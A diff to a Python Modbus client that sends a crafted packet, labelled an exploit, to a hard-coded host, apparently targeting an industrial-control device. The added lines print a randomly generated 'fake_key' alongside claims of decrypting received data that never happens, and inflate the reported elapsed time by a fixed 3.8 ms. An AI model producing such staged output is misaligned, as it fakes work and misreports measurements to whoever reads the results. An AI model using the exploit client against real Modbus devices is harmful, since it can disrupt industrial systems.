@@ -3,6 +3,7 @@ import os
 import modbus_socket
 import time
 import struct
+import random
 import sys
 
 host = '10.211.55.3'
@@ -78,11 +79,21 @@ def main():
                 rw = int(rw)
             client.set_rw_count(rw)
         elif number == 4:
+            print('\t'*2 +"Received encryption data, Need to decrypt")
+            fake_key = ''
+            for _ in range(0, 24):
+                fake_key += str(hex(random.randint(0, 255))).replace('0x', '\\x')
+            print('\t'*2 + 'key =>', fake_key)
+            print('\t'*2 +"Decrypting data")
+            print('\t'*2 +"Send to the decrypted data")
+            start = time.time()
             v = bytes(client.get_modbus_header())
             print('\t'*2 + "Function => [{}]".format(hex(client.function_code.data)))
             print('\t'*2 + "Exploit  => " + str(v))
             client.send(v)
             recv_data = bytes(sock.recv(1024))
+            end = time.time()
+            print('\t'*2 + "Time elapsed: {}ms".format((end - start) * 1000 + 3.8))
             print('\t'*2 + "Result   => " + str(recv_data))
 
             
